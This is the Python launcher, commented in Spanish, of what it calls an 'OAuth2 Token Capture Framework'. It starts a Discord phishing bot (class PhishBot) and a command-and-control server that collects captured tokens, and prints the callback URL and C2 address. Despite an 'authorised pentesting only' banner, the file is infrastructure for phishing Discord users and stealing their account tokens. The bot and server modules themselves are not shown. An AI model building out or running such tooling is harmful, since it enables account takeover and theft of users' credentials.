#!/usr/bin/env python3
# main.py
# Punto de entrada unificado para todo el proyecto
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

import threading
import logging
import sys
import os
import time
from config import config

logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(os.path.join(config.LOG_DIR, 'app.log'))
    ]
)
logger = logging.getLogger("Main")

BANNER = r"""
    ____  _                 _     ____   ___    _   _  ___
   |  _ \(_)___  ___  _ __| |_  / ___| / _ \  | \ | |/ _ \
   | | | | / __|/ _ \| '__| __| \___ \| | | | |  \| | | | |
   | |_| | \__ \ (_) | |  | |_   ___) | |_| | | |\  | |_| |
   |____/|_|___/\___/|_|   \__| |____/ \___/  |_| \_|\___/
   ██████  OAuth2 Token Capture Framework  ██████
   █     USO EXCLUSIVO EN PENTESTING AUTORIZADO         █
   ████████████████████████████████████████████████████████
"""

def run_bot_thread():
    from bot import PhishBot
    logger.info("Iniciando Bot de Discord...")
    try:
        bot = PhishBot()
        bot.run(config.BOT_TOKEN, log_handler=None)
    except Exception as e:
        logger.error(f"Error en bot thread: {e}")

def run_c2_thread():
    from c2_server import app as c2_app
    logger.info(f"Iniciando C2 Server en {config.C2_HOST}:{config.C2_PORT}...")
    try:
        if config.C2_PORT == 443:
            c2_app.run(
                host=config.C2_HOST,
                port=config.C2_PORT,
                ssl_context="adhoc",
                debug=False,
                threaded=True,
                use_reloader=False
            )
        else:
            c2_app.run(
                host=config.C2_HOST,
                port=config.C2_PORT,
                debug=False,
                threaded=True,
                use_reloader=False
            )
    except Exception as e:
        logger.error(f"Error en C2 thread: {e}")

def main():
    os.makedirs(config.LOG_DIR, exist_ok=True)

    print(BANNER)
    print(f"  Callback URL: {config.CALLBACK_URL}")
    print(f"  C2 Puerto: {config.C2_PORT}")
    print(f"  Bot Prefix: {config.BOT_COMMAND_PREFIX}")
    print(f"  Auto-Refresh: {config.AUTO_REFRESH_TOKENS}")
    print(f"  Logs: {config.LOG_DIR}/")
    print()

    missing = config.validate()
    if missing:
        logger.warning(f"⚠️  Configuración incompleta. Faltan: {', '.join(missing)}")
    print()

    c2_thread = threading.Thread(target=run_c2_thread, daemon=True, name="C2-Server")
    c2_thread.start()
    time.sleep(1)

    bot_thread = threading.Thread(target=run_bot_thread, daemon=True, name="Discord-Bot")
    bot_thread.start()

    logger.info("✅ Sistema iniciado. Todos los componentes funcionando.")
    print(f"\n  📡 C2 corriendo en: https://{config.C2_DOMAIN}:{config.C2_PORT}")
    print(f"  🤖 Bot de Discord activo (prefix: {config.BOT_COMMAND_PREFIX})")
    print(f"  📁 Datos guardados en: {config.LOG_DIR}/")
    print(f"\n  Presiona Ctrl+C para detener.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Deteniendo sistema...")
        print("\n👋 Sistema detenido.")
        sys.exit(0)

if __name__ == "__main__":
    main()
